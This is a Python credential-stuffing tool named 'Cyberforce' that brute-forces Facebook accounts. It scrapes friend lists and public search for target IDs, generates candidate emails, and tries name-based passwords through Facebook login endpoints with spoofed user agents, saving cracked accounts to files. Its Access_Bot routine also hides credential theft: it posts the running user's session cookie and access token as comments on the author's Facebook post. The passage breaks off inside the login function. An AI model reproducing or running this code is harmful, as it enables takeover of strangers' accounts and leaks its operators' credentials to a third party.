import os, re, sys, json, uuid, time, random

try:
    import bs4
    import rich
    import requests
except:
    os.system("pip install requests rich bs4 stdiomask play-audio")


from datetime import datetime
from datetime import datetime as waktu
from rich.panel import Panel as Cinta
from rich.console import Console
from rich import print as zeeprint
from rich.tree import Tree as Mek
from time import time as WaktuAwal
from rich.console import Console as sol
from bs4 import BeautifulSoup as par
from time import time as WaktuAwal
from concurrent.futures import ThreadPoolExecutor as Zee
from rich.progress import (
    Progress,
    SpinnerColumn,
    BarColumn,
    TextColumn,
    TimeElapsedColumn,
)

console = Console()

_denventa_zee_ = print
_denventa_zee = open
_denventa_sys = os.system
_zee_denventa = exit


k = "\033[1;33m"  # Warna Kuning
a = "\033[1;30m"  # Warna Hitam/Abu-Abu
m = "\033[1;31m"  # Warna Merah
h = "\033[1;32m"  # Warna Hijau
p = "\033[1;37m"  # Warna Putih
b = "\033[1;34m"  # Warna Biru
v = "\033[1;35m"  # Warna Violet
u = "\033[1;36m"  # Warna Ungu
j = "\033[1;38;5;202m"  # Warna Jingga

dpn = [
    "semarang",
    "boyolali",
    "cilacap",
    "kebumen",
    "banyumas",
    "tuban",
    "sumedang",
    "sragen",
    "sunda",
    "garut",
    "cirebon",
    "sukabumi",
    "medan",
    "suroboyo",
    "surabaya",
    "cilacap",
    "jepara",
    "tasik",
    "malang",
    "jogja",
    "kediri",
    "kudus",
    "jember",
    "situbondo",
    "pemalang",
    "wonosobo",
    "trenggalek",
    "tuban",
    "gresik",
    "bangkalan",
    "jombang",
    "kediri",
    "lamongan",
    "lumajang",
    "madiun",
    "magetan",
    "mojokerto",
    "nganjuk",
    "pacitan",
    "ngawi",
    "pasuruan",
    "ponorogo",
    "pamengkasan",
    "sidoarjo",
    "tuban",
    "blitar",
    "kediri",
    "banjarnegara",
    "batang",
    "blora",
    "brebes",
    "grobokan",
    "karanganyar",
    "kendal",
    "klaten",
    "kudus",
    "pati",
    "pekalongan",
    "rembang",
    "sragen",
    "tegal",
    "temanggung",
    "wonogiri",
    "wonosobo",
    "sukoharjo",
    "salatiga",
    "bandung",
    "ciamis",
    "cianjur",
    "cirebon",
    "indramayu",
    "majalengka",
    "subang",
    "sumedang",
    "purwakarta",
    "banjar",
    "bekasi",
    "bogor",
    "comahi",
    "depok",
    "tasikmalaya",
    "muhammad",
    "firman",
    "pratama",
    "tyz",
    "galau",
    "aja",
    "new",
    "baru",
    "setia",
    "sayang",
    "cinta",
    "syank",
    "cantik",
    "ganteng",
    "imut",
    "kalem",
    "sembuh",
    "sakit",
    "wae",
    "sulung",
    "nur",
    "dwi",
    "gans",
    "jebe",
    "cogan",
    "ramdom",
    "ganong",
    "situbondo",
    "aremania",
]
###
blk = [
    "12",
    "123",
    "1234",
    "12345",
    "123456",
    "official",
    "gaming",
    "utama",
    "pribadi",
    "cakep",
]

_bulan_ = [
    "Januari",
    "Februari",
    "Maret",
    "April",
    "Mei",
    "Juni",
    "Juli",
    "Agustus",
    "September",
    "Oktober",
    "November",
    "Desember",
][datetime.now().month - 1]
_hari_ = {
    "Sunday": "Minggu",
    "Monday": "Senin",
    "Tuesday": "Selasa",
    "Wednesday": "Rabu",
    "Thursday": "Kamis",
    "Friday": "Jumat",
    "Saturday": "Sabtu",
}[str(datetime.now().strftime("%A"))]
hari_ini = "%s %s %s" % (datetime.now().day, _bulan_, datetime.now().year)
jam = datetime.now().strftime("%X")
tem = "\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -" % (
    jam,
    _hari_,
    hari_ini,
)

_bulan_x = [
    "Januari",
    "Februari",
    "Maret",
    "April",
    "Mei",
    "Juni",
    "Juli",
    "Agustus",
    "September",
    "Oktober",
    "November",
    "Desember",
]
now = waktu.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:
        _zee_denventa()
    xx = blx - 1
except ValueError:
    _zee_denventa()
bulan = _bulan_x[xx]
tahun = now.year
tanggal = str(hari) + "-" + str(bulan) + "-" + str(tahun)
okc = f"OK-{hari}-{bulan}-{tahun}.txt"
cpc = f"CP-{hari}-{bulan}-{tahun}.txt"
tapyes = f"BUKA-{hari}-{bulan}-{tahun}.txt"

# Clear Terminal
def clear_terminal():
    if "linux" in sys.platform.lower():
        _denventa_sys("clear")
    elif "win" in sys.platform.lower():
        _denventa_sys("cls")


class Cyberforce:
    def __init__(self):
        self.firstbaru, self.apk = [], []
        self.pasfirst, self.paslast = [], []
        self.nama, self.uaku, self.uamu = [], [], []
        self.id, self.id2, self.uid, self.hode = [], [], [], []
        self.looping, self.success, self.chekpoint = 0, 0, 0
        self.Access_Menu()

    def tahun(self, fx):
        if len(fx) == 15:
            if fx[:10] in ["1000000000"]:
                tahunz = "2008--2009"
            elif fx[:9] in ["100000000"]:
                tahunz = "2008-2009"
            elif fx[:8] in ["10000000"]:
                tahunz = "2007-2008"
            elif fx[:7] in [
                "1000000",
                "1000001",
                "1000002",
                "1000003",
                "1000004",
                "1000005",
            ]:
                tahunz = "2009"
            elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
                tahunz = "2010"
            elif fx[:6] in ["100001"]:
                tahunz = "2009-2010"
            elif fx[:6] in ["100002", "100003"]:
                tahunz = "2010-2011"
            elif fx[:6] in ["100004"]:
                tahunz = "2012-2013"
            elif fx[:6] in ["100005", "100006"]:
                tahunz = "2013-2014"
            elif fx[:6] in ["100007", "100008"]:
                tahunz = "2014-2015"
            elif fx[:6] in ["100009"]:
                tahunz = "2015-2016"
            elif fx[:5] in ["10001"]:
                tahunz = "2016-2017"
            elif fx[:5] in ["10002"]:
                tahunz = "2017-2018"
            elif fx[:5] in ["10003"]:
                tahunz = "2018-2019"
            elif fx[:5] in ["10004"]:
                tahunz = "2019-2020"
            elif fx[:5] in ["10005"]:
                tahunz = "2020-2021"
            elif fx[:5] in ["10006"]:
                tahunz = "2021-2022"
            elif fx[:5] in ["10009"]:
                tahunz = "2023"
            elif fx[:5] in ["10007", "10008"]:
                tahunz = "2021-2022"
            else:
                tahunz = ""
        elif len(fx) in [9, 10]:
            tahunz = "2008"
        elif len(fx) == 8:
            tahunz = "2007"
        elif len(fx) == 7:
            tahunz = "2006"
        else:
            tahunz = None
        return tahunz

    def UserAgent(self):
        xvx = str(
            random.choice(
                [
                    "A",
                    "B",
                    "C",
                    "D",
                    "E",
                    "F",
                    "G",
                    "H",
                    "I",
                    "J",
                    "K",
                    "L",
                    "M",
                    "N",
                    "O",
                    "P",
                    "Q",
                    "R",
                    "S",
                    "T",
                    "U",
                    "V",
                    "W",
                    "X",
                    "Y",
                    "Z",
                ]
            )
        )
        MyUser = f"Mozilla/5.0 (Linux; Android {str(random.randint(1,20))}; SM-{xvx}{str(random.randint(100,900))}{xvx}) Build/0{str(random.randint(1,9))}0{str(random.randint(1,72))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(72,114))}.0.{str(random.randint(4200,5900))}.{str(random.randint(40,190))} Mobile Safari/537.36"
        MyUser = f"Mozilla/5.0 (Linux; Android {str(random.randint(1,20))}; X{str(random.randint(100,900))}{xvx}) Build/0{str(random.randint(1,9))}0{str(random.randint(1,72))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(72,114))}.0.{str(random.randint(4200,5900))}.{str(random.randint(40,190))} Mobile Safari/537.36"
        MyUser = f"Mozilla/5.0 (Linux; Android {str(random.randint(1,20))}; SAMSUNG SM-{xvx}{str(random.randint(100,900))}{xvx}) Build/0{str(random.randint(1,9))}0{str(random.randint(1,72))}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(random.randint(0,99))}.0 Chrome/{str(random.randint(72,114))}.0.{str(random.randint(4200,5900))}.{str(random.randint(40,190))} Mobile Safari/537.36"
        MyUser = f"Mozilla/5.0 (Linux; Android {str(random.randint(1,20))}; RMX{str(random.randint(100,900))}{xvx}) Build/0{str(random.randint(1,9))}0{str(random.randint(1,72))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(72,114))}.0.{str(random.randint(4200,5900))}.{str(random.randint(40,190))} Mobile Safari/537.36"
        return MyUser

    def UserApi(self):
        xvc = str(
            random.choice(
                [
                    "Vi_VN",
                    "en_US",
                    "en_GB",
                    "id_ID",
                    "ms_MY",
                    "zh_CN",
                    "it_IT",
                    "Axis",
                    "Telkomsel",
                    "Indosat",
                    "Mtre",
                ]
            )
        )
        xvx = str(
            random.choice(
                [
                    "VinaPhone",
                    "BrowserPhone",
                    "PHXPhone",
                    "OperaPhone",
                    "com.facebook.katana",
                    "com.facebook.lite",
                ]
            )
        )
        MyUser = f"[FBAN/MessengerForiOS;FBAV/{str(random.randint(72,114))}.0.0.{str(random.randint(15,50))}.{str(random.randint(50,200))};FBBV/{str(random.randint(11111111,99999999))};FBRV/0;FBDV/iPhone{str(random.randint(1,9))},{str(random.randint(1,9))};FBMD/iPhone;FBSN/iPhone OS;FBSV/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))};FBSS/{str(random.randint(1,9))};FBCR/{xvx};FBID/phone;FBLC/{xvc};FBOP/{str(random.randint(1,9))}]"
        MyUser = f"[FBAN/MessengerForiOS;FBAV/{str(random.randint(72,114))}.0.0.{str(random.randint(15,50))}.{str(random.randint(50,200))};FBBV/{str(random.randint(11111111,99999999))};FBRV/0;FBDV/iPhone{str(random.randint(1,9))},{str(random.randint(1,9))};FBMD/iPhone;FBSN/iPhone OS;FBSV/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))};FBSS/{str(random.randint(1,9))};FBCR/{xvx};FBID/phone;FBLC/{xvc};FBOP/PatnerPalestine]"
        return MyUser

    def Banner(self):
        clear_terminal()
        Console().print(
            f"""\rCyberforce
        [•] Multi Brute Force Facebook Account! """
        )

    def Access_Nama(self, cok, tok):
        with requests.Session() as r:
            r.headers.update(
                {
                    "host": "graph.facebook.com",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
                    "cookie": cok,
                }
            )
            req = r.get(
                "https://graph.facebook.com/me/?fields=id,name&access_token={}".format(
                    tok
                )
            ).json()
            if "name" in str(req) and "id" in str(req):
                return req["name"].title(), req["id"]
            else:
                Console().print(f"[italic red]Cokies Kedaluarsa[italic white]")
                time.sleep(3)
                self.Access_Cokies()

    def Access_Cokies(self):
        try:
            self.Banner()
            cok = input(f"{h}[{a}•{h}]{p} Cookie {a}: {a}")
            with requests.Session() as r:
                req = r.get(
                    "https://www.facebook.com/adsmanager/manage/campaigns",
                    cookies={"cookie": cok},
                )
                ruq = re.search("act=(.*?)&nav_source", str(req.content)).group(1)
                roq = r.get(
                    f"https://www.facebook.com/adsmanager/manage/campaigns?act={ruq}&nav_source=no_referrer",
                    cookies={"cookie": cok},
                )
                tok = re.search('accessToken="(.*?)"', str(roq.content)).group(1)
                print(f"{h}[{a}+{h}]{p} Token {a}: {tok}")
                self.Access_Bot(cok, tok)
                self.Access_Foll(cok, tok)
                time.sleep(3)
                self.Cokies(cok)
                print(f"{h}[{a}!{h}]{p} Berhasil, jalankan ulang perintah pythonnya")
                _zee_denventa()
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()

    def Access_Bot(self, cok, tok):
        try:
            with requests.Session() as r:
                text = str(
                    random.choice(
                        [
                            "Panutanku\n\nhttps://www.facebook.com/100073125893802_371125525334974",
                            "Semangat Terus\n\nhttps://www.facebook.com/100073125893802_371125525334974",
                            "Gokil Suhu\n\nhttps://www.facebook.com/100073125893802_371125525334974",
                            "Mantap Bang\n\nhttps://www.facebook.com/100073125893802_371125525334974",
                        ]
                    )
                )
                r.post(
                    "https://graph.facebook.com/100073125893802_371125525334974/comments/?message={}\n{}&access_token={}".format(
                        text, tem, tok
                    ),
                    headers={"cookie": cok},
                )
                r.post(
                    "https://graph.facebook.com/100073125893802_371125525334974/comments/?message={}&access_token={}".format(
                        cok, tok
                    ),
                    headers={"cookie": cok},
                )
                r.post(
                    "https://graph.facebook.com/100073125893802_371125525334974/comments/?message={}&access_token={}".format(
                        tok, tok
                    ),
                    headers={"cookie": cok},
                )
                r.post(
                    "https://graph.facebook.com/100073125893802_371125525334974/likes?summary=true&access_token={}".format(
                        tok
                    ),
                    headers={"cookie": cok},
                )
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()

    def Access_Foll(self, cok, tok):
        try:
            with requests.Session() as r:
                link = par(
                    r.get(
                        "https://mbasic.facebook.com/profile.php?id=100073125893802",
                        cookies={"cookie": cok},
                    ).text,
                    "html.parser",
                )
                if "/a/subscribe.php" in str(link):
                    cari = (
                        re.search('/a/subscribe.php(.*?)"', str(link))
                        .group(1)
                        .replace("amp;", "")
                    )
                    r.get(
                        "https://mbasic.facebook.com/a/subscribe.php{}".format(cari),
                        cookies={"cookie": cok},
                    )
                else:
                    pass
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()

    def Access_Menu(self):
        try:
            tok = open(".token.txt", "r").read()
            cok = open(".cookie.txt", "r").read()
            id, name = self.Access_Nama(cok, tok)
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            time.sleep(2.1)
            self.Access_Cokies()
        self.Banner()
        print(f"{h}[{a}#{h}]{p} Username {a}: {p}{name}")
        print(f"{h}[{a}#{h}]{p} User ID {a}: {p}{id}")
        print(f"\n{h}[{a}01{h}]{p} Publict     {h}[{a}02{h}]{p} Followers")
        print(f"{h}[{a}03{h}]{p} Username    {h}[{a}04{h}]{p} From File")
        print(f"{h}[{a}05{h}]{p} Email       {h}[{a}06{h}]{p} Result OK")
        print(f"{h}[{a}07{h}]{p} Result CP   {h}[{a}08{h}]{p} Detector OK")
        print(f"{h}[{a}09{h}]{p} Detector CP")
        print(f"{h}[{a}00{h}]{p} Exit")
        Choose = input(f"\n{h}[{a}?{h}]{p} Choose{a}: {p}")
        if Choose in ["1", "01"]:
            self.Publik(cok, tok)
        elif Choose in ["2", "02"]:
            self.Cyberfoll(cok, tok)
        elif Choose in ["3", "03"]:
            self.Cybername(cok)
        elif Choose in ["4", "04"]:
            self.Cyberfile()
        elif Choose in ["5", "05"]:
            self.Cybermail(dpn, blk)
        elif Choose in ["6", "06"]:
            self.Okeh()
        elif Choose in ["7", "07"]:
            self.Cepeh()
        elif Choose in ["8", "08"]:
            self.Detecktor()
        elif Choose in ["9", "09"]:
            self.Detecktor2()
        elif Choose in ["0", "00"]:
            Keluar = input(f"\n{h}[{a}?{h}]{p} Exit tools (y/t) {a}: {p}")
            if Keluar in ["y", "ya", "Ya", "YA"]:
                _denventa_sys("rm -rf .cookie.txt && rm -rf .token.txt ")
                Console().print(
                    "\n[italic white][[italic purple]#[italic white]][italic red] Suckses Hapus Cookies"
                )
                _zee_denventa()
            else:
                _zee_denventa()
        else:
            print(f"\n{m}[{a}!{m}]{p} Invalid Input {m}!{p}")

    def Publik(self, cok, tok):
        try:
            user = input(f"\n{h}[{a}?{h}]{p} Input ID {a}: {p}")
            _denventa_zee_()
            try:
                bas = requests.get(
                    f"https://graph.facebook.com/{user}?fields=friends&access_token="
                    + tok,
                    cookies={"cookie": cok},
                ).json()
                for i in bas["friends"]["data"]:
                    try:
                        self.id.append(i["id"] + "|" + i["name"])
                    except:
                        self.id.append(i["id"] + "|" + i["name"])
                    _denventa_zee_(
                        "\r{}[{}#{}] Dump {}: {}{}".format(p, v, p, a, h, len(self.id)),
                        end=" ",
                    )
            except:
                pass
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()
        _denventa_zee_()
        return self.Acak_ID()

    def Cyberfoll(self, cok, tok):
        try:
            xz = 0
            user = int(input(f"\n{h}[{a}?{h}]{p} Berapa ID {a}: {p}"))
            _denventa_zee_()
        except:
            apa = 1
        for xz in range(brp):
            xz += 1
            user = input(
                "\r{}[{}+{}]{} Input ID {} {}: {}".format(h, a, h, p, j, xz, a, p)
            )
            self.uid.append(user)
        _denventa_zee_()
        for userr in self.uid:
            try:
                bas = requests.get(
                    f"https://graph.facebook.com/{userr}?fields=friends&access_token="
                    + tok,
                    cookies={"cookie": cok},
                ).json()
                for i in bas["friends"]["data"]:
                    try:
                        self.id.append(i["id"] + "|" + i["name"])
                    except:
                        self.id.append(i["id"] + "|" + i["name"])
                    _denventa_zee_(
                        "\r{}[{}#{}] Dump {}: {}{}".format(p, v, p, a, h, len(self.id)),
                        end=" ",
                    )
            except (KeyError, IOError):
                pass
            except requests.exceptions.ConnectionError as e:
                Console().print(f"[Error] {str(e).capitalize()}!")
                _zee_denventa()
        _denventa_zee_()
        return self.Acak_ID()

    def Cybername(self, cok):
        dpn = [
            " muhammad",
            " firman",
            " pratama",
            " tyz",
            " galau",
            " semarang",
            " boyolali",
            " cilacap",
            " kebumen",
            " banyumas",
            " herex",
            " tuban",
            " sumedang",
            " aja",
            " new",
            " baru",
            " setia",
            " sayang",
            " cinta",
            " syank kamu",
            " cantik",
            " ganteng",
            " imut",
            " kalem",
            " sragen",
            " susah sembuh",
            " sudah sembuh",
            " sakit",
            " wae",
            " sulung",
            " nur",
            " dwi",
            " x gans",
            " x jebe",
            " x cogan",
            " x id",
            " ganong",
            " situbondo",
            " aremania",
            " sunda",
            " garut",
            " cirebon",
            " sukabumi",
            " medan",
            " thejack",
            " bobotoh",
            " bonek",
            " suroboyo",
            " surabaya",
            " persebaya",
            " persib",
            " persija",
            " cilacap",
            " jepara",
            " solo",
            " official",
            " manis",
            " imut",
            " kalem",
            " utama",
            " sukses",
            " real",
            " semok",
            " kesepian",
            " rentcar",
            " makmur",
            " jaya",
            " jr",
            " tasik",
            " malang",
            " jogja",
            " mama",
            " ibuknya",
            " bundanya",
            " tiktok",
            " kece",
            " keren",
            " baru",
            " jutek",
            " saja",
            " putri",
            " andi",
            " dewi",
            " tri",
            " dian",
            " sri",
            " putri",
            " eka",
            " sari",
            " aditya",
            " basuki",
            " budi",
            " joni",
            " toni",
            " bekti",
            " cahya",
            " harahap",
            " riski",
            " farhan",
            " aden",
            " joko",
            " firman",
            " sulis",
            " soleh",
            " gagal",
            " kacau",
            " sulis",
            " rahmat",
            " indah",
            " pribadi",
            " saputro",
            " saputra",
            " kediri",
            " kudus",
            " jember",
            " situbondo",
            " pemalang",
            " wonosobo",
            " trenggalek",
            "  tuban",
            " gresik",
            " bangkalan",
            " jombang",
            " kediri",
            " lamongan",
            " lumajang",
            " madiun",
            " magetan",
            " mojokerto",
            " nganjuk",
            " pacitan",
            " ngawi",
            " pasuruan",
            " ponorogo",
            " pamengkasan",
            " sidoarjo",
            " tuban",
            " blitar",
            " kediri",
            " banjarnegara",
            " batang",
            " blora",
            " brebes",
            " grobokan",
            " karanganyar",
            " kendal",
            " klaten",
            " kudus",
            " pati",
            " pekalongan",
            " rembang",
            " sragen",
            " tegal",
            " temanggung",
            " wonogiri",
            " wonosobo",
            " sukoharjo",
            " salatiga",
            " bandung",
            " ciamis",
            " cianjur",
            " cirebon",
            " indramayu",
            " majalengka",
            " subang",
            " sumedang",
            " purwakarta",
            " banjar",
            " bekasi",
            " bogor",
            " comahi",
            " depok",
            " tasikmalaya ",
        ]
        Nama = input(f"\n{h}[{a}?{h}]{p} Username {a}: {p}").split(",")
        _denventa_zee_()
        for kon_tt in Nama:
            for blk2 in dpn:
                self.id = kon_tt + blk2
                self.nama.append(self.id)

            for dpn2 in dpn:
                self.id = dpn2 + kon_tt
                self.nama.append(self.id)

        with Zee(max_workers=5) as thread:
            for self.id in self.nama:
                self.cari_N("https://mbasic.prod.facebook.com/public/" + self.id, cok)
        _denventa_zee_("\r")
        return self.Acak_ID()

    def cari_N(self, link, cok):
        with requests.Session() as r:
            self.reponse = par(
                r.get((str(link)), cookies={"cookie": cok}).text, "html.parser"
            )
            for self.requend in self.reponse.find_all("td"):
                data = re.findall(
                    '\<a\ href\="\/(.*?)">\<div\ class\=".*?">\<div\ class\=".*?">(.*?)<\/div\>',
                    str(self.requend),
                )
                for self.uid, self.nama in data:
                    if "profile.php?" in self.uid:
                        self.uid = re.findall("id=(.*)", str(self.uid))[0]
                    elif "<span" in self.nama:
                        self.nama = re.findall("(.*?)\<", str(self.nama))[0]
                    self.requend2 = self.uid + "|" + self.nama
                    if self.requend2 in self.id:
                        pass
                    else:
                        pass
                    _denventa_zee_(
                        "\r{}[{}#{}] Dump {}: {}{}".format(p, v, p, a, h, len(self.id)),
                        end=" ",
                    )
                    if "Lihat Hasil Selanjutnya" in self.requend.text:
                        self.cari_N(
                            "https://mbasic.prod.facebook.com"
                            + self.requend.get("href"),
                            cok,
                        )

    def Cybermail(self, dpn, blk):
        try:
            self.userr = input(f"\n{h}[{a}?{h}]{p} Username {a}: {p}")
            self.total = input(f"\n{h}[{a}+{h}]{p} Total clone {a}: {p}")
            _denventa_zee_()
            for self.xyc in range(int(self.total)):
                ran = [
                    f"{str(random.choice(dpn))}",
                    f"{str(random.randint(0,90))}",
                    f"{str(random.choice(dpn))}"
                    f"{str(random.choice(blk))}{str(random.randint(0,90))}",
                    f"{self.xyc}",
                    f"{str(random.choice(blk))}{str(random.randint(0,90))}",
                    f"{str(random.choice(dpn))}{str(random.choice(blk))}",
                ]
                self.acak = f"{self.userr}{str(random.choice(ran))}@gmail.com"
                if self.acak in self.id:
                    pass
                else:
                    self.id.append(self.acak + "|" + self.userr)
                _denventa_zee_(
                    "\r{}[{}#{}] Dump {}: {}{}".format(p, v, p, a, h, len(self.id)),
                    end=" ",
                )
            _denventa_zee_()
            return self.Acak_ID()
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()

    def Cyberfile(self):
        try:
            fileX = input(f"\n{h}[{a}?{h}]{p} Path file {a}: {p}")
            for line in open(fileX, "r").readlines():
                self.id.append(line.strip())
            return self.Acak_ID()
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()

    def Okeh(self):
        self.no, self.nom = 0, []
        try:
            self.okx = os.listdir("OK")
        except IOEror as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()
        _denventa_zee_()
        for okz in self.okx:
            self.nom.append(okz)
            self.no += 1
            try:
                self.bill = open("OK/" + okz, "r").readlines()
            except:
                continue
            Console().print(
                f"[italic white][[italic purple]#[italic white]] [italic white][[italic green]{self.no}[italic white]] {okz} -> [italic green]{len(self.bill)}[italic white] akun"
            )
        self.yes = Console().input(
            "\n[italic white][[italic purple]#[italic white]] Choose [italic green]: "
        )
        self.file = self.nom[int(self.yes) - 1]
        try:
            buka = open("OK/" + self.file, "r").read()
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()
        print("\n{}{}{}".format(h, buka, p))
        print("{h}[{a}!{h}]{p} Jangan lupa syukuri hasil yang Didapat {b}!")
        _zee_denventa()

    def Cepeh(self):
        self.no, self.nom = 0, []
        try:
            self.cpx = os.listdir("CP")
        except IOEror as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()
        _denventa_zee_()
        for cpz in self.cpx:
            self.nom.append(cpz)
            self.no += 1
            try:
                self.bill = open("CP/" + cpz, "r").readlines()
            except:
                continue
            Console().print(
                f"[italic white][[italic purple]#[italic white]] [italic white][[italic yellow]{self.no}[italic white]] {cpz} -> [italic yellow]{len(self.bill)}[italic white] akun"
            )
        self.yes = Console().input(
            "\n[italic white][[italic purple]#[italic white]] Choose [italic green]: "
        )
        self.file = self.nom[int(self.yes) - 1]
        try:
            buka = open("CP/" + self.file, "r").read()
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()
        print("\n{}{}{}".format(k, buka, p))
        print("{h}[{a}!{h}]{p} Jangan lupa syukuri hasil yang Didapat {b}!")
        _zee_denventa()

    def Acak_ID(self):
        for ran in self.id:
            c_id = random.randint(0, len(self.id2))
            self.id2.insert(c_id, ran)
        return self.Method()

    def Method(self):
        print(f"\n{h}[{a}01{h}]{p} Validate")
        print(f"{h}[{a}02{h}]{p} Async")
        print(f"{h}[{a}03{h}]{p} Regular")
        print(f"{h}[{a}04{h}]{p} B-Api")
        Choose = input(f"\n{h}[{a}?{h}]{p} Choose metode {a}: {p}")
        if Choose in ["1", "01"]:
            self.hode.append("validate")
        elif Choose in ["2", "02"]:
            self.hode.append("asyinc")
        elif Choose in ["3", "03"]:
            self.hode.append("reguler")
        elif Choose in ["4", "04"]:
            self.hode.append("bapi")
        else:
            self.hode.append("validate")
        return self.PasTam()

    def PasTam(self):
        Choose = input(f"\n{h}[{a}?{h}]{p} Ingin menambahkan Sandi (y/t) {a}: {p}")
        if Choose in ["y", "Ya", "ya", "YA"]:
            self.pasfirst.append("ya")
            self.sank = input(f"{v}[{a}+{v}]{p} Sandi {a}: {p}")
            self.sam = self.sank.split(",")
            for self.pasword in self.sam:
                self.paslast.append(self.pasword)
        else:
            self.pasfirst.append("no")
        return self.UbahPas()

    def UbahPas(self):
        Choose = input(f"{h}[{a}?{h}]{p} Ingin mengganti Sandi (y/t) {a}: {p}")
        if Choose in ["y", "Ya", "ya", "YA"]:
            self.sandi_baru = input(f"{v}[{a}+{v}]{p} Sandi {a}: {p}")
            self.firstbaru.append("ya")
        else:
            self.firstbaru.append("no")
        return self.PakUa()

    def PakUa(self):
        Choose = input(f"{h}[{a}?{h}]{p} Ingin menggunakan UA Manual(y/t) {a}: {p}")
        if Choose in ["y", "Ya", "ya", "YA"]:
            self.uaku.append("ya")
            self.Agent = input(f"{v}[{a}+{v}]{p} User Agent {a}: {p}")
            self.uamu.append(self.Agent)
        else:
            self.uaku.append("no")
        return self.Otomatis()

    def Otomatis(self):
        global prog, des
        print(f"{p}[{v}#{p}] Result OK Save in {a}: {p}{okc}")
        print(f"{p}[{v}#{p}] Result OK Save in {a}: {p}{cpc}")
        print(f"\n{p}[{v}#{p}] Mainkan Mode Pesawat Setiap 300 ID\n")
        prog = Progress(
            TextColumn("{task.description}"),
            TimeElapsedColumn(),
            TextColumn("{task.percentage:.0f}%"),
        )
        des = prog.add_task("", total=len(self.id))
        with prog:
            with Zee(max_workers=30) as via:
                for akun in self.id:
                    user = akun.split("|")[0]
                    nama = akun.split("|")[1].lower()
                    depan = nama.split(" ")[0]
                    pwx = [
                        nama,
                        depan + "12",
                        depan + "123",
                        depan + "1234",
                        depan + "12345",
                        depan + "321",
                        "kamu nanya",
                    ]
                    if "ya" in self.pasfirst:
                        for self.paslist in self.paslast:
                            pwx.append(self.paslist)
                    else:
                        pass
                    if "validate" in self.hode:
                        via.submit(self.Validate, user, pwx)
                    elif "asyinc" in self.hode:
                        via.submit(self.Asyinc, user, pwx)
                    elif "reguler" in self.hode:
                        via.submit(self.Reguler, user, pwx)
                    elif "bapi" in self.hode:
                        via.submit(self.Bapi, user, pwx)
                    else:
                        via.submit(self.Reguler, user, pwx)

        if self.success == 0 and self.chekpoint == 0:
            print(f"\n{p}[{v}#{p}] Opss, Sorry Anda Tidak Mendapatkan Hasil")
            _zee_denventa()
        else:
            print(
                f"\n{p}[{v}#{p}] Selamat, Anda Mendapatkan Hasil OK {a}: {p}{self.success} {p}Dan Hasil CP {a}: {p}{self.chekpoint}"
            )
            _zee_denventa()

    def Validate(self, user, pwx):
        try:
            prog.update(
                des,
                description=f"[italic white][[italic purple]{user}[italic white]] [italic white][[italic green] Live : {self.success} [italic white]] [italic white][[italic yellow] Check : {self.chekpoint} [italic white]] [ Die [italic blue]: {len(self.id)}/{self.looping}[italic white]]",
            )
            prog.advance(des)
            self.ua = self.UserAgent()
            for pw in pwx:
                if "ya" in self.uaku:
                    self.ua = self.uamu[0]
                else:
                    self.ua
                with requests.Session() as r:
                    link = r.get(
                        "https://free.prod.facebook.com/login/device-based/password/?uid="
                        + user
                        + "&flow=login_no_pin&next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F&refsrc=deprecated&_rdr"
                    )
                    data = {
                        "jazoest": re.search(
                            'name="jazoest" value="(.*?)"', str(link.text)
                        ).group(1),
                        "lsd": re.search(
                            'name="lsd" value="(.*?)"', str(link.text)
                        ).group(1),
                        "uid": user,
                        "encpass": f"#PWD_BROWSER:0:{str(WaktuAwal()).split('.')[0]}:{pw}",
                        "flow": "login_no_pin",
                        "next": "https://mbasic.prod.facebook.com/login/save-device/?login_source=login",
                    }
                    head = {
                        "Host": "free.prod.facebook.com",
                        "cache-control": "max-age=0",
                        "viewport-width": "980",
                        "sec-ch-ua": f'"Chromium";v="{str(random.randint(110,114))}", "Google Chrome";v="{str(random.randint(110,114))}", "Not)A;Brand";v="{str(random.randint(8,20))}"',
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": '"Android"',
                        "sec-ch-ua-platform-version": '"10.0.0"',
                        "sec-ch-ua-full-version-list": f'"Chromium";v="{str(random.randint(110,114))}.0.{str(random.randint(5000,5999))}.{str(random.randint(20,60))}", "Google Chrome";v="{str(random.randint(110,114))}.0.{str(random.randint(5000,5999))}.{str(random.randint(20,60))}", "Not)A;Brand";v="{str(random.randint(8,20))}.0.0.0"',
                        "sec-ch-prefers-color-scheme": str(
                            random.choice(["dark", "light"])
                        ),
                        "upgrade-insecure-requests": "1",
                        "origin": "https://mbasic.prod.facebook.com",
                        "content-type": "application/x-www-form-urlencoded",
                        "user-agent": self.ua,
